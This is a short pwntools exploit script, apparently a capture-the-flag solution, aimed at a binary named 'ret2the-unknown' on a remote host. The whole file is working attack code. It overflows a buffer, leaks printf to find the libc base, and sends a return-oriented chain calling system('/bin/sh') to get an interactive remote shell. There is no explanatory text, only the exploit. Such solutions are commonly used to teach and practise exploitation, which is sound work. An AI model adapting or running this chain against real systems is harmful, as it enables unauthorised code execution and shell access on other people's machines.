from pwn import *

p = remote("mc.ax", 31568)
elf = ELF("./ret2the-unknown")
rop = ROP(elf)

libc = ELF("libc-2.28.so")

RET_MAIN = elf.symbols['main']
padding = b'A' * 40

payload1 = padding + p64(RET_MAIN)

p.sendline(payload1)
p.recvuntil("to get there: ")

printf_mem = int(p.recvline().rstrip(b'\n').decode(),16)

base = printf_mem - libc.symbols["printf"]
libc.address = base
system_addr = libc.symbols['system']
bin_sh_addr = libc.search('/bin/sh\x00').next()
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

exit = libc.sym["exit"]
shell = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(exit)
p.sendline(shell)
p.interactive()